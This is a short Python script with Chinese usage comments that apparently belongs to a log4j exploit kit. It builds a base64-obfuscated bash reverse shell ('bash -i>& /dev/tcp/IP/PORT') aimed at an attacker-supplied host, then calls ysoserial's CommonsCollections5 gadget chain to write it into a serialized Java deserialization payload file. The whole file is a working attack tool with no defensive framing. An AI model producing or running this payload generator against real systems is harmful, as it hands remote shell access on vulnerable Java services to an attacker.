#usage:
#python log4j ip port
#IP为主机IP
#port为监听的端口
#须将该文件与ysoserial-master.jar放在同一文件夹下执行


import os
import base64
import sys

ip = sys.argv[1]
port = sys.argv[2]
test = 'bash -i>& /dev/tcp/%s/%s 0>&1'%(ip,port)
test_base64 = base64.b64encode(test)
payload = 'bash -c {echo,'+test_base64+'}|{base64,-d}|{bash,-i}'
cmd = 'java -jar ysoserial-master.jar CommonsCollections5 \''+payload+'\' > exp.bin'
os.system(cmd)
